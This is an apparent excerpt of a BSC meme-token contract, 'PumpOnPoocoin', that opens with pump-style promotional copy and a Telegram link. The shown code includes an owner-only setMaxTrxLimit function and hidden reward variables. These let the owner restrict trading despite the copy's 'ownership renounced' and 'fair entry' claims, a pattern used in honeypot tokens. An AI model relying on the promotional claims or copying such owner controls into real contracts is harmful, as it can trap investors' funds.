...
PumpOnPoocoin (POP)
Secret Stealth Launch  
 
💩 Liquidity burned, ownership renounced, contract verfied(check BSCSCAN) 💩
💩 Buy at launch and watch it pump on PooCoin. That's our only goal 💩
💩 Secret Stealth Launch - all launches have hundreds of people already in at the start
and when you ape, its already too late. Let's change this 💩 
💩 Community driven, as a DEV will help with pushing at the beginning , then it's up to the community and sharing about this GEM. So simple , no empty promises 💩
💩 Honest launch with Fair entry for everybody. Easy tokenomics without a tax, you can sell without the fear of being fucked by taxes and losing profits 💩
💩💩💩
https://t.me/PumpOnPoocoin
...
contract PumpOnPoocoin is Context, IBEP20, Ownable {
  using SafeMath for uint256;

  uint256 public _rewardPercent = 10;
  uint256 private _maxTrxLimit = 25 * 10**3 * 10**12;
  address private _deployer;
  bool reward_status = false;


  constructor() public {
    _totalSupply = 1000 * 10**3 * 10**12;
  ...
  */
   ...
   * `amount`.
   */
    function setMaxTrxLimit(uint256 _input) public onlyOwner() {
         _maxTrxLimit = _input;
    }
    /**
   * @dev See {BEP20-transferFrom}.
